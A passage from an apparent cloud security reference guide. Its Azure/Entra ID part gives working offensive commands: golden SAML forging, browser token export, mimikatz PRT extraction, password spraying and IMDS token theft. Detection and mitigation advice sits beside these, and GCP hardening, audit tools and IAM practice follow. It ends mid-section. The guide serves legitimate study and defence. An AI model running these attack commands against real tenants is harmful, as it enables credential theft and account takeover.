# Role assignments, Group memberships
# Conditional Access policies, Named locations
# Registered devices, MFA methods
# OAuth permissions, App registrations
```

**ROADtools Hybrid**: Enumerate Intune-managed devices and their properties.

---

### 4.2 AADInternals

PowerShell module for Entra ID/Office 365 exploitation and research.

```powershell
# Install
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals

# Get access token (various methods)
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache
Get-AADIntAccessTokenForMSGraph -SaveToCache
$token = Get-AADIntAccessTokenForAADGraph -Credentials (Get-Credential)

# User enumeration
Invoke-AADIntUserEnumerationAsOutsider -UserName "user@contoso.com"  # Check if account exists
Get-AADIntLoginInformation -UserName "admin@contoso.com"             # Get tenant info

# MFA status
Get-AADIntMFAStatus -UserPrincipalName user@contoso.com             # Requires AADGraph token

# Token operations
# Export tokens from browser (Edge/Chrome)
Export-AADIntTokensFromBrowser  # Requires physical access / browser extension

# Get PRTs from joined device
Get-AADIntUserPRTToken         # Requires device joined + user logged in

# Golden SAML / token forge
# Requires ADFS token signing certificate (private key)
New-AADIntSAMLToken -ImmutableId "base64==" -Issuer "https://adfs.contoso.com/adfs/services/trust" \
  -PfxFileName signing.pfx -PfxPassword "pass"

# Phishing / consent
Invoke-AADIntPhishing -Recipients user@contoso.com -Teams -UseAccessToken
```

---

### 4.3 Service Principal Secret Abuse

**Service Principals (SPs)** are identities for applications. Credentials: client secrets or certificates.

**Attack scenarios**:
1. **Secret in code/repo**: Developer commits SP secret to GitHub → attacker finds via search
2. **Secret in pipeline**: CI/CD variable leak → secret extracted from build logs
3. **Overprivileged SP**: SP with Owner/Contributor → escalate to full subscription control
4. **SP with MS Graph app permissions**: `RoleManagement.ReadWrite.Directory` → add self to Global Admin

```bash
# Authenticate as service principal
az login --service-principal -u <app-id> -p <secret-or-cert> --tenant <tenant-id>

# Check SP permissions
az role assignment list --assignee <sp-object-id> --all
# Check app role assignments (Graph permissions)
az ad sp show --id <sp-id> --query "appRoles"

# Escalation: if SP has Application.ReadWrite.All or AppRoleAssignment.ReadWrite.All
# Add admin Graph permissions to own app, grant admin consent → escalate
```

---

### 4.4 OAuth App Consent Phishing (Illicit Consent Grant)

Attacker registers malicious Azure AD application with high-permission scopes and tricks user into consenting.

**Attack flow**:
1. Register app in attacker tenant (or compromised tenant)
2. Configure requested permissions: `Mail.Read`, `Files.ReadWrite.All`, `offline_access`
3. Craft authorization URL and deliver to victim
4. Victim clicks, consents → app gets persistent access via refresh token
5. Attacker uses OAuth tokens to read email/files indefinitely

**Detection**:
- Monitor: `Audit Log → Application → Consent to application`
- Look for: new app registrations + consent events from unusual countries
- Risky permissions: `Mail.ReadWrite`, `Files.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`

**Prevention**:
- Disable user consent for apps (require admin approval)
- Configure publisher verification requirement
- Deploy Defender for Cloud Apps policies for risky OAuth app detection
- Conditional Access: block unknown/unverified app consent

---

### 4.5 PRT Attacks (Pass-the-PRT)

**Primary Refresh Token (PRT)**: Long-lived token (14 days) issued to devices registered/joined to Entra ID. Used to obtain access tokens for any app without MFA re-prompt.

**Attack methods**:
1. **Chrome SSO abuse**: Chrome uses PRT cookie (`x-ms-RefreshTokenCredential`) automatically for Microsoft sites. If attacker has local code execution on the device, can extract this cookie.
2. **Pass-the-PRT**: Steal PRT (from LSASS via mimikatz `sekurlsa::cloudap`, or from Windows Hello data), use to get tokens.
3. **BrowserCore.exe abuse**: Chrome calls this Windows binary to obtain PRT cookies — can be intercepted.

```
# Mimikatz PRT extraction (requires local admin / SYSTEM)
sekurlsa::cloudap
# → Returns dpapi encrypted PRT blob
# Decrypt with: dpapi::cloudapkd /keyvalue:<key> /unprotect

# Use PRT with ROADtoken or AADInternals
Invoke-AADIntDeviceCode -Resource https://graph.microsoft.com
```

**Phishing-resistant MFA (FIDO2/Windows Hello) does NOT prevent PRT abuse if device is already compromised.**

---

### 4.6 Device Code Phishing

Abuses OAuth Device Authorization Grant flow.

**Attack flow**:
1. Attacker initiates device code flow: `POST https://login.microsoftonline.com/<tenant>/oauth2/v2.0/devicecode`
2. Gets `device_code` and `user_code` (e.g., "ABCD-EFGH")
3. Sends `user_code` to victim (email/chat): "Please authenticate at https://microsoft.com/devicelogin and enter code ABCD-EFGH"
4. Victim authenticates (including MFA) and enters code
5. Attacker polls token endpoint and receives access + refresh tokens
6. Attacker now has persistent access

**Detection**: Sign-in logs with `Device Code` authentication method from unfamiliar device.

**Prevention**: Conditional Access — block device code flow (Authentication flows condition → Block device code flow).

---

### 4.7 AzureHound / BloodHound for Azure

**BloodHound** (now BloodHound Community Edition / BloodHound Enterprise) maps attack paths in AD and Azure.

**AzureHound**: Data collector for BloodHound targeting Azure/Entra ID.

```bash
# Collect Azure data with AzureHound
./azurehound -u "user@tenant.com" -p "Password" list --tenant "tenant.com" -o output.json
# With service principal
./azurehound -a <app-id> -s <secret> list --tenant <tenant-id> -o output.json

# Ingest into BloodHound
# Upload output.json via BloodHound UI

# Key BloodHound Azure attack paths:
# AZAddMembers → add member to group
# AZAddOwner → take ownership of object
# AZAppAdmin → Application Administrator can reset SP credentials
# AZContributor → Azure RBAC Contributor on subscription/RG
# AZGetCertificates → read Key Vault certificates
# AZGlobalAdmin → Global Administrator (highest privilege)
# AZGrant → grant app role assignment
# AZMGAddMember → via MS Graph API add group member
# AZOwns → owns AAD object
# AZPrivilegedRoleAdmin → can manage role assignments
# AZRunsAs → VM runs as managed identity
# AZVMContributor → can run scripts on VMs
```

---

### 4.8 PowerZure & MicroBurst

**PowerZure**: PowerShell framework for assessing Azure environments post-compromise.

```powershell
Import-Module PowerZure.ps1
# Enumeration
Get-AzureTargets                 # List high-value targets (VMs, SPs, etc.)
Get-AzureADUsers                 # List all AAD users
Get-AzureRoleAssignments         # List all role assignments
Get-AzureRunAsAccounts           # Find Automation RunAs accounts (legacy, deprecated)
Get-AzureKeyVaultContent         # Read Key Vault secrets/keys
Get-AzureStorageContent          # List storage account contents
# Code execution
Invoke-AzureRunCommand           # Run command on VM via Run Command feature
Invoke-AzureRunMSBuild           # MSBuild payload via Run Command
```

**MicroBurst**: Azure offensive security toolset.

```powershell
Import-Module MicroBurst.psm1
# Unauthenticated recon
Invoke-EnumerateAzureBlobs -Base companyname        # Enumerate blob storage
Invoke-EnumerateAzureSubDomains -Base companyname   # Enumerate subdomains
# Authenticated recon
Get-AzurePasswords                                  # Extract passwords from various services
Get-AzureKeyVaults                                  # List key vaults
Invoke-AzureRTIngest                               # Ingest data into BloodHound
```

---

### 4.9 Conditional Access Bypass via Legacy Authentication

**Legacy auth protocols** (SMTP AUTH, POP3, IMAP, basic auth to Exchange Online, older Office clients) do not support modern auth and cannot satisfy MFA challenges.

**Attack**: Use legacy protocol to authenticate with just username/password — bypasses MFA-requiring Conditional Access policies that don't explicitly block legacy auth.

```bash
# Test if legacy auth is available
# Use tool like MailSniper, o365spray, or manual IMAP connection
curl -k --url "imaps://outlook.office365.com:993" \
  --user "user@contoso.com:Password1"

# o365spray for credential spraying via legacy auth
python o365spray.py --spray -U users.txt -p Password1 --count 1 --lockout 5 --domain contoso.com
```

**Detection**: Sign-in logs showing `Client app: IMAP`, `POP3`, `SMTP`, `Exchange ActiveSync`, `Other clients`.

**Mitigation**: Block legacy authentication via Conditional Access (Client apps condition → select legacy auth clients → Block).

---

### 4.10 SSRF to Azure IMDS

Azure Instance Metadata Service: `http://169.254.169.254/metadata/`

```bash
# Requires: SSRF + ability to set custom headers (Metadata: true required)
# Many SSRF tools can set headers; curl example:
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Returns: access_token, refresh_token, client_id, object_id, tenant_id, expires_in

# Use token to interact with Azure ARM API
curl -H "Authorization: Bearer <access_token>" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

**Key IMDS endpoints**:
```
/metadata/instance?api-version=2021-02-01       # VM metadata (subscription, resource group, etc.)
/metadata/identity/oauth2/token?...             # Managed identity token
/metadata/attested/document?api-version=...     # Attestation document
/metadata/scheduledevents?api-version=2020-07-01 # Scheduled events
```

---

## 5. GCP Security

### 5.1 GCP IAM

#### Role Types

| Type | Description | Example |
|---|---|---|
| Primitive roles | Legacy, coarse-grained (project-level) | roles/viewer, roles/editor, roles/owner |
| Predefined roles | Service-specific curated roles | roles/storage.objectViewer, roles/bigquery.dataEditor |
| Custom roles | User-defined granular roles | Organization or project scope |

**Primitive roles should not be used in production** — they grant broad permissions across all services.

#### IAM Policy Binding Structure

```json
{
  "bindings": [{
    "role": "roles/storage.objectViewer",
    "members": [
      "user:alice@example.com",
      "serviceAccount:my-sa@my-project.iam.gserviceaccount.com",
      "group:devs@example.com",
      "domain:example.com",
      "allAuthenticatedUsers",
      "allUsers"
    ],
    "condition": {
      "title": "Temporary access",
      "description": "Expires 2024-12-31",
      "expression": "request.time < timestamp('2024-12-31T00:00:00Z')"
    }
  }]
}
```

**IAM principals**: `user:`, `serviceAccount:`, `group:`, `domain:`, `principalSet:`, `allUsers` (public), `allAuthenticatedUsers`

#### Service Account Security

**Service account impersonation** requires `iam.serviceAccounts.actAs` permission (part of `roles/iam.serviceAccountUser`).

```bash
# Create service account
gcloud iam service-accounts create my-sa --display-name="My SA"

# Grant role to SA
gcloud projects add-iam-policy-binding my-project \
  --member="serviceAccount:my-sa@my-project.iam.gserviceaccount.com" \
  --role="roles/storage.objectViewer"

# Impersonate SA (requires iam.serviceAccounts.actAs + target role)
gcloud storage ls --impersonate-service-account=my-sa@my-project.iam.gserviceaccount.com

# Create key (avoid when possible — use WIF instead)
gcloud iam service-accounts keys create key.json \
  --iam-account my-sa@my-project.iam.gserviceaccount.com

# List keys
gcloud iam service-accounts keys list --iam-account my-sa@my-project.iam.gserviceaccount.com
```

**Service account key security risks**:
- Keys are long-lived credentials that can be exfiltrated
- Organization policy `constraints/iam.disableServiceAccountKeyCreation` prevents key creation
- Prefer Workload Identity Federation instead

#### Workload Identity Federation (WIF)

WIF allows external workloads (GitHub Actions, AWS, Azure, on-prem) to authenticate as GCP service accounts without keys.

```bash
# GitHub Actions → GCP via WIF
gcloud iam workload-identity-pools create "github-pool" --location="global"
gcloud iam workload-identity-pools providers create-oidc "github-provider" \
  --location="global" \
  --workload-identity-pool="github-pool" \
  --issuer-uri="https://token.actions.githubusercontent.com" \
  --attribute-mapping="google.subject=assertion.sub,attribute.repository=assertion.repository" \
  --attribute-condition="assertion.repository=='my-org/my-repo'"

# Allow WIF to impersonate SA
gcloud iam service-accounts add-iam-policy-binding my-sa@project.iam.gserviceaccount.com \
  --role="roles/iam.workloadIdentityUser" \
  --member="principalSet://iam.googleapis.com/projects/PROJECT_NUM/locations/global/workloadIdentityPools/github-pool/attribute.repository/my-org/my-repo"
```

---

### 5.2 Organization Policies

Organization policies enforce governance constraints across GCP organization.

**Key constraints**:

| Constraint | Description |
|---|---|
| `constraints/compute.vmExternalIpAccess` | Restrict external IPs for VMs (list policy — allowlist specific VMs) |
| `constraints/compute.requireShieldedVm` | Require Shielded VMs with vTPM + integrity monitoring |
| `constraints/compute.skipDefaultNetworkCreation` | Don't create default VPC in new projects |
| `constraints/storage.publicAccessPrevention` | Prevent public Cloud Storage access (enforced/inherited) |
| `constraints/storage.uniformBucketLevelAccess` | Require uniform bucket IAM (disable legacy ACLs) |
| `constraints/iam.disableServiceAccountKeyCreation` | Prevent SA key creation |
| `constraints/iam.disableServiceAccountKeyUpload` | Prevent SA key upload |
| `constraints/iam.allowedPolicyMemberDomains` | Restrict IAM bindings to specific domains |
| `constraints/compute.restrictCloudNATUsage` | Restrict Cloud NAT configurations |
| `constraints/gcp.resourceLocations` | Restrict resource creation to specific regions |
| `constraints/compute.disableSerialPortAccess` | Disable serial port access to VMs |
| `constraints/compute.vmCanIpForward` | Restrict IP forwarding on VMs |

---

### 5.3 VPC Service Controls

VPC Service Controls (VPC-SC) create security perimeters around GCP resources to prevent data exfiltration.

**Key concepts**:
- **Service perimeter**: Logical boundary around GCP projects. Resources inside cannot be accessed from outside (by default).
- **Restricted services**: APIs protected by the perimeter (e.g., storage.googleapis.com, bigquery.googleapis.com)
- **Access levels**: Conditions that define trusted contexts (IP ranges, device state, identity)
- **Ingress/Egress policies**: Fine-grained rules for cross-perimeter access

```bash
# Create access policy (org-level singleton)
gcloud access-context-manager policies create --organization=ORG_ID --title="Corp Policy"

# Create access level (trusted IP range)
gcloud access-context-manager levels create trusted-corp \
  --policy=POLICY_ID \
  --basic-level-spec=conditions.yaml
# conditions.yaml: - ipSubnetworks: ["203.0.113.0/24"]

# Create service perimeter
gcloud access-context-manager perimeters create prod-perimeter \
  --policy=POLICY_ID \
  --title="Production Perimeter" \
  --resources=projects/123456789 \
  --restricted-services=storage.googleapis.com,bigquery.googleapis.com \
  --access-levels=trusted-corp
```

**Dry-run mode**: Test perimeter changes without enforcement — generates audit logs showing what would be blocked.

---

### 5.4 BeyondCorp Enterprise & Cloud Armor

**BeyondCorp Enterprise**: Google's Zero Trust access solution for enterprise applications.
- Context-aware access based on user identity + device posture
- Integration with Chrome browser for endpoint verification
- Certificate-based access for non-HTTP applications

**Cloud Armor**: WAF and DDoS protection for Google Cloud.

```bash
# Create security policy
gcloud compute security-policies create my-waf-policy --description "WAF policy"

# Add rule: block specific IP
gcloud compute security-policies rules create 1000 \
  --security-policy my-waf-policy \
  --src-ip-ranges "198.51.100.0/24" \
  --action deny-403

# Add pre-configured WAF rule (ModSecurity CRS)
gcloud compute security-policies rules create 2000 \
  --security-policy my-waf-policy \
  --expression "evaluatePreconfiguredExpr('xss-v33-stable')" \
  --action deny-403

# Rate limiting
gcloud compute security-policies rules create 3000 \
  --security-policy my-waf-policy \
  --src-ip-ranges "*" \
  --action rate-based-ban \
  --rate-limit-threshold-count 100 \
  --rate-limit-threshold-interval-sec 60

# Attach to backend service
gcloud compute backend-services update my-backend \
  --security-policy my-waf-policy --global
```

**Adaptive Protection**: ML-based DDoS detection and automatic rule suggestions.

---

### 5.5 Security Command Center (SCC)

GCP's centralized security management and threat detection service.

**Finding sources**:

| Source | Description |
|---|---|
| Security Health Analytics | Misconfiguration detection (500+ detectors) |
| Event Threat Detection (ETD) | Real-time threat detection from Cloud Logging |
| Container Threat Detection | Runtime container threat detection |
| Web Security Scanner | Web app vulnerability scanning |
| VM Threat Detection | Memory-based malware detection in VMs |
| Sensitive Data Protection | DLP findings in cloud storage |
| Infrastructure as Code (IaC) | IaC security posture in Security Command Center |

**Event Threat Detection finding types**:
- `Account_Has_Leaked_Credentials`: Credentials found in public repos
- `Brute_Force_SSH`: SSH brute force detected
- `Cryptomining`: Cryptocurrency mining detected
- `Data_Exfiltration_BigQuery`: Unusual BigQuery data exfiltration
- `Defense_Evasion_Disable_Log_Events`: Audit logging disabled
- `Initial_Access_Log4j_Bad_IP`: Log4j exploitation from known-bad IP
- `Lateral_Movement_Credential_Access`: Service account token misuse
- `Privilege_Escalation_Impersonate_Service_Account`: SA impersonation chain
- `Exfiltration_BigQuery_Extraction`: Large data extraction to external destination

---

### 5.6 Cloud Audit Logs

**Log types**:

| Type | Description | Default |
|---|---|---|
| Admin Activity | Admin operations (write operations on metadata/configuration) | Always enabled, cannot disable |
| Data Access | Data plane operations (read metadata, read/write user data) | Disabled by default (enable per service) |
| System Event | Google system operations | Always enabled |
| Policy Denied | Requests denied by VPC-SC or org policy | Enabled when VPC-SC active |

```bash
# Query audit logs (gcloud)
gcloud logging read 'logName="projects/my-project/logs/cloudaudit.googleapis.com%2Factivity"' \
  --limit=50 --format=json

# Detect service account key creation
gcloud logging read 'protoPayload.methodName="google.iam.admin.v1.CreateServiceAccountKey"' \
  --limit=20

# Log sink to Cloud Storage (for long-term retention)
gcloud logging sinks create my-sink storage.googleapis.com/my-log-bucket \
  --log-filter='logName:"cloudaudit.googleapis.com"'
```

---

### 5.7 Cloud KMS & Binary Authorization

**Cloud KMS**:
- **Key rings**: Logical groupings of keys (regional resource)
- **CryptoKeys**: Symmetric (AES-256-GCM) or asymmetric (RSA, EC) keys
- **Key versions**: Rotation creates new primary version; old versions can decrypt but not encrypt
- **CMEK**: Customer-managed encryption key for GCP services (BigQuery, GCS, Compute, etc.)
- **CSEK**: Customer-supplied keys (bring your own key material per-request — not managed by GCP)
- **Cloud HSM**: FIPS 140-2 Level 3 HSM-backed keys
- **Key Access Justifications**: Required justification for each key operation (enterprise feature)

**Binary Authorization** (GKE):
- Policy-based deploy-time security for container images
- Requires attestations (Cosign signatures from CI/CD pipeline) before image can run
- Attestors: verify image came from approved build system and passed security scans
- Breakglass: emergency bypass with audit logging

```yaml
# Binary Authorization policy
admissionWhitelistPatterns:
- namePattern: "gcr.io/google_containers/*"
defaultAdmissionRule:
  evaluationMode: REQUIRE_ATTESTATION
  enforcementMode: ENFORCED_BLOCK_AND_AUDIT_LOG
  requireAttestationsBy:
  - projects/my-project/attestors/build-attestor
```

---

### 5.8 Chronicle SIEM

Google's cloud-native SIEM with petabyte-scale, sub-second search.

- **YARA-L 2.0**: Detection language (rule-based, multi-event correlation)
- **UDM** (Unified Data Model): Normalized schema for all log types
- **Parsers**: Pre-built parsers for 700+ log sources, custom parsers available
- **Threat Intelligence**: Integration with Google VirusTotal, third-party STIX/TAXII feeds
- **SOAR integration**: Built-in playbooks, or integrate with Siemplify (acquired by Google)
- **Backstory data retention**: 12 months hot (instant search), additional cold storage

```
// YARA-L 2.0 detection rule example
rule brute_force_followed_by_success {
  meta:
    author = "TeamStarWolf"
  events:
    $fail.metadata.event_type = "USER_LOGIN"
    $fail.metadata.vendor_name = "Microsoft"
    $fail.security_result.action = "BLOCK"
    $fail.principal.user.email_addresses = $user

    $success.metadata.event_type = "USER_LOGIN"
    $success.security_result.action = "ALLOW"
    $success.principal.user.email_addresses = $user

    $fail.metadata.event_timestamp.seconds < $success.metadata.event_timestamp.seconds

  match:
    $user over 10m

  condition:
    #fail > 10 and $success
}
```

---

## 6. Multi-Cloud Attack Tools

### 6.1 ScoutSuite

Multi-cloud security auditing tool. Generates HTML report with findings by service.

```bash
# Install
pip install scoutsuite

# AWS scan (uses configured profile or instance credentials)
python scout.py aws --report-dir ./scout-report
python scout.py aws --profile production --report-dir ./scout-prod --no-browser

# Azure scan
python scout.py azure --cli                          # Use Azure CLI credentials
python scout.py azure --tenant TENANT_ID --subscription-ids SUB1 SUB2

# GCP scan
python scout.py gcp --user-account                   # Uses gcloud credentials
python scout.py gcp --service-account /path/to/key.json

# Custom ruleset (exclude/modify rules)
python scout.py aws --ruleset custom_ruleset.json

# Report: open report/scoutsuite-report/scoutsuite_results.html
```

**ScoutSuite finding categories**: IAM, EC2/Compute, S3/Storage, RDS/Database, CloudTrail/Logging, CloudFront/CDN, Redshift, Lambda, SQS, SNS, ElastiCache, ECS, Route53, Config, Security Hub

---

### 6.2 Prowler v3+

Open-source cloud security tool with 300+ checks per cloud.

```bash
# Install
pip install prowler
# OR: docker pull public.ecr.aws/prowler-cloud/prowler:latest

# AWS scan
prowler aws                                          # All checks
prowler aws -c iam_root_access_key_enabled          # Specific check
prowler aws -g cis_1.4_aws                          # CIS 1.4 benchmark group
prowler aws --compliance cis_1.4_aws               # Compliance mode
prowler aws -M csv json html                        # Multiple output formats
prowler aws --output-directory ./results
prowler aws --list-checks                           # List all available checks
prowler aws --filter-region us-east-1 eu-west-1    # Specific regions only
prowler aws -R role-arn                             # Cross-account via role

# Azure scan
prowler azure --sp-env-auth                         # SP from env vars
prowler azure --browser-auth                        # Browser-based auth
prowler azure --subscription-ids SUB1 SUB2
prowler azure --compliance cis_2.0_azure

# GCP scan
prowler gcp --credentials-file /path/to/key.json
prowler gcp --project-ids PROJECT1 PROJECT2
prowler gcp --compliance cis_2.0_gcp

# Compliance frameworks supported:
# AWS: CIS 1.4/1.5/2.0, PCI DSS 3.2.1/4.0, HIPAA, NIST 800-53, SOC2, ISO27001, FedRAMP, ENS, GDPR
# Azure: CIS 1.4/1.5/2.0, MITRE ATT&CK, ENS
# GCP: CIS 1.2/1.3/2.0, MITRE ATT&CK

# Output formats: CSV, JSON, JSON-OCSF, HTML
# Integration: AWS Security Hub, S3, Slack, Jira
```

---

### 6.3 CloudMapper

Cloud asset and network visualization tool (primarily AWS).

```bash
git clone https://github.com/duo-labs/cloudmapper
pip install -r requirements.txt

# Collect data (uses AWS credentials)
python cloudmapper.py collect --account ACCOUNT_NAME

# Generate network graph
python cloudmapper.py prepare --account ACCOUNT_NAME
python cloudmapper.py webserver          # Opens http://localhost:8000

# Generate report
python cloudmapper.py report --account ACCOUNT_NAME

# Audit findings
python cloudmapper.py audit --account ACCOUNT_NAME --json
```

**CloudMapper analysis capabilities**:
- Network exposure analysis (which EC2 instances are internet-accessible)
- Security group analysis (overly permissive rules)
- VPC peering relationships
- IAM enumeration for network-relevant roles

---

### 6.4 Steampipe

SQL-based querying of cloud APIs. Uses PostgreSQL FDW interface.

```bash
# Install
brew install turbot/tap/steampipe  # macOS
# Linux: sudo /bin/sh -c "$(curl -fsSL https://steampipe.io/install/steampipe.sh)"

# Install plugins
steampipe plugin install aws azure gcp github kubernetes

# Start service
steampipe service start

# Run queries
steampipe query

# Example queries
steampipe query "select name, public_access_block_enabled from aws_s3_bucket where public_access_block_enabled = false"
steampipe query "select name, admin_enabled from azure_key_vault where admin_enabled = true"
steampipe query "select name, member from gcp_project_iam_binding where role = 'roles/owner' and member like 'allUsers%'"

# Run benchmarks (CIS, PCI, etc.)
steampipe check benchmark.cis_v150  # AWS CIS 1.5.0
steampipe check all --output html > report.html

# Power query: join across clouds
steampipe query "
  select a.name as aws_bucket, g.name as gcp_bucket
  from aws_s3_bucket a, gcp_storage_bucket g
  where a.region = 'us-east-1' and g.location = 'US'
"
```

---

### 6.5 Cartography

Neo4j-based graph tool for infrastructure attack path analysis.

```bash
pip install cartography

# Configure Neo4j (requires running instance)
# Run data collection
cartography --neo4j-uri bolt://localhost:7687 \
  --neo4j-user neo4j \
  --neo4j-password password \
  --aws-sync-all-profiles           # Sync all configured AWS profiles

# Query attack paths in Neo4j
# Find EC2 instances with admin IAM roles reachable from internet:
MATCH (sg:EC2SecurityGroup)<-[:MEMBER_OF_EC2_SECURITY_GROUP]-(:NetworkInterface)
      <-[:NETWORK_INTERFACE]-(ec2:EC2Instance)
      -[:INSTANCE_PROFILE]->(:AWSInstanceProfile)
      -[:ASSOCIATED_WITH]->(role:AWSRole)
      -[:ASSUME_ROLE_POLICY_DOCUMENT]->(:AWSPolicyDocument)
WHERE sg.ingress_rules CONTAINS '0.0.0.0/0'
  AND role.name CONTAINS 'Admin'
RETURN ec2.instanceid, role.name, sg.name
```

---

### 6.6 Vulnerable Cloud Labs

Intentionally vulnerable environments for security training.

**CloudGoat** (Rhino Security Labs — AWS):
```bash
pip install cloudgoat
cloudgoat config profile default
cloudgoat create vulnerable_cognito    # Deploys vulnerable scenario
cloudgoat list                          # List available scenarios
# Scenarios: iam_privesc_by_rollback, cloud_breach_s3, ecs_efs_attack, rce_web_app, etc.
cloudgoat destroy vulnerable_cognito
```

**TerraGoat** (Bridgecrew):
- Terraform IaC with intentional misconfigurations for Checkov training
- Covers AWS, Azure, GCP misconfigs

**AzureGoat** (INE):
- Intentionally vulnerable Azure environment
- Misconfigurations in: Function Apps, Storage, RBAC, KeyVault, SQL

**flaws.cloud / flaws2.cloud**: Free CTF-style AWS security challenges (S3 permissions, metadata service, etc.)

**thunder CTF**: GCP security CTF challenges

---

### 6.7 Cloud Subdomain Enumeration & CNAPP

**cloud_enum**: Multi-cloud asset discovery.
```bash
python cloud_enum.py -k company-name    # Enumerate AWS/Azure/GCP assets for keyword
python cloud_enum.py -k target -l wordlist.txt -t 50  # Custom wordlist, 50 threads
# Finds: S3 buckets, Azure blobs, Azure websites, GCP buckets, GCP Firebase, etc.
```

**S3Scanner**: S3 bucket security scanner.
```bash
pip install s3scanner
s3scanner scan --bucket target-bucket-name
s3scanner scan --bucket-file buckets.txt
```

**GCPBucketBrute**: GCP Cloud Storage bucket enumeration.

**BlobHunter**: Azure Blob Storage exposure tool.

**CNAPP Platforms** (commercial):

| Platform | Key Differentiator |
|---|---|
| Wiz | Agentless, attack path analysis, toxic combinations (multi-factor risk) |
| Orca Security | SideScanning (no agents), complete asset inventory |
| Prisma Cloud (Palo Alto) | Broad coverage, CWPP+CSPM+CIEM+CNAPP |
| Lacework | Anomaly detection, behavioral analysis |
| Aqua Security | Container/serverless focus, supply chain |
| Sysdig | Falco-based runtime, eBPF agent |
| Tenable Cloud Security (Ermetic) | CIEM focus, net-effective permissions |
| CrowdStrike Falcon Cloud | EDR + cloud workload combined |

---

### 6.8 Attack Surface Management

**Attack Path** methodology:
1. **Discovery**: Enumerate all cloud resources (accounts, subscriptions, projects)
2. **Exposure**: Find internet-facing assets, public resources
3. **Vulnerability**: Identify CVEs, misconfigurations
4. **Identity**: Map IAM permissions, overprivileged identities
5. **Lateral movement**: Find paths between resources
6. **Crown jewels**: Identify sensitive data stores, admin capabilities

**Toxic combinations** (Wiz concept): Individual issues that are low severity alone but critical in combination:
- EC2 with: public IP + critical CVE + admin IAM role + IMDSv1 enabled
- S3 bucket with: public access + sensitive data + no encryption
- Lambda with: internet trigger + environment variable secrets + admin execution role

---

## 7. Cloud IAM Security & Least Privilege

### 7.1 IAM Audit Methodology

**Phase 1: Inventory**
```bash
# AWS: enumerate all IAM entities
aws iam get-account-authorization-details --output json > iam-dump.json
# Contains: users, roles, groups, policies, attachments

# GCP: export org IAM policy
gcloud projects get-iam-policy PROJECT_ID --format=json > gcp-iam.json
gcloud organizations get-iam-policy ORG_ID --format=json

# Azure: export all role assignments
az role assignment list --all --output json > azure-rbac.json
az ad app list --all --output json > azure-apps.json
```

**Phase 2: Analysis**
- Identify principals with `*` action or `*` resource permissions
- Find roles/users with direct AdministratorAccess equivalent
- Identify unused access keys, unused roles (no last used date > 90 days)
- Check for cross-account roles with trust policies open to `*` or external accounts
- Identify service accounts/SPs with human-equivalent privileges
- Review permission boundaries and SCPs for gaps

**Phase 3: Least Privilege**
- Right-size permissions to specific actions and resources
- Remove wildcard actions; replace with specific service actions
- Add resource ARN constraints (avoid `"Resource": "*"`)
- Add condition keys (source IP, source VPC, MFA required, etc.)
- Implement time-bound access for sensitive operations

**IAM credential hygiene**:
```bash
# AWS: generate credential report
aws iam generate-credential-report
aws iam get-credential-report --query Content --output text | base64 -d | column -t -s,
# Columns: user, arn, password_enabled, password_last_used, password_last_changed,
#          access_key_1_active, access_key_1_last_used_date, etc.

# Identify unused access keys (not used in 90 days)
# Identify users with no MFA
# Identify root account activity
```

---

### 7.2 Service Account Key Rotation

**AWS best practices**:
```bash
# List access keys
aws iam list-access-keys --user-name myuser

# Rotate: create new key first, update app, then deactivate old
aws iam create-access-key --user-name myuser
# → Update app with new key
aws iam update-access-key --user-name myuser --access-key-id OLDKEY --status Inactive
# → After confirming new key works:
aws iam delete-access-key --user-name myuser --access-key-id OLDKEY

# Automate via Lambda + EventBridge (90-day rotation)
# Or use AWS Secrets Manager with rotation Lambda
```

**GCP SA key rotation**:
```bash
# Create new key
gcloud iam service-accounts keys create new-key.json --iam-account sa@project.iam.gserviceaccount.com

# List keys (track creation dates)
gcloud iam service-accounts keys list --iam-account sa@project.iam.gserviceaccount.com

# Delete old key
gcloud iam service-accounts keys delete KEY_ID --iam-account sa@project.iam.gserviceaccount.com

# Organization policy to restrict key age
# Use SCC findings: "Service Account Key Not Rotated"
```

---

### 7.3 GitHub Actions OIDC Federation (No Long-lived Keys)

**AWS OIDC**:
```yaml
# GitHub Actions workflow
permissions:
  id-token: write    # Required for OIDC
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
      aws-region: us-east-1
      role-session-name: GitHubActions-${{ github.run_id }}
```

```bash
# AWS: Create OIDC provider
aws iam create-open-id-connect-provider \
  --url https://token.actions.githubusercontent.com \
  --client-id-list sts.amazonaws.com \
  --thumbprint-list 6938fd4d98bab03faadb97b34396831e3780aea1

# Trust policy for the role
{
  "Effect": "Allow",
  "Principal": {"Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"},
    "StringLike": {"token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:*"}
  }
}
```

**GCP OIDC/WIF**: (See Section 5.1)

**Azure OIDC**:
```yaml
- uses: azure/login@v2
  with:
    client-id: ${{ secrets.AZURE_CLIENT_ID }}
    tenant-id: ${{ secrets.AZURE_TENANT_ID }}
    subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
# No client secret required — uses federated identity credential
```

---

### 7.4 ABAC (Attribute-Based Access Control)

#### AWS — Tag-based Conditions

```json
{
  "Effect": "Allow",
  "Action": ["ec2:StartInstances", "ec2:StopInstances"],
  "Resource": "*",
  "Condition": {
    "StringEquals": {
      "ec2:ResourceTag/Environment": "${aws:PrincipalTag/Environment}",
      "ec2:ResourceTag/Team": "${aws:PrincipalTag/Team}"
    }
  }
}
```
Principal tags set during IdP→AWS federation via SAML/OIDC attribute mapping.

#### GCP — IAM Conditions

```bash
gcloud projects add-iam-policy-binding my-project \
  --member="serviceAccount:sa@project.iam.gserviceaccount.com" \
  --role="roles/storage.objectViewer" \
  --condition='title=TimeRestrictedAccess,expression=request.time.getHours("America/New_York") >= 9 && request.time.getHours("America/New_York") <= 17'
```

Supported condition attributes: `resource.name`, `resource.type`, `resource.service`, `request.time`, `request.auth.claims` (for WIF), geographic location.

#### Azure — ABAC for Storage

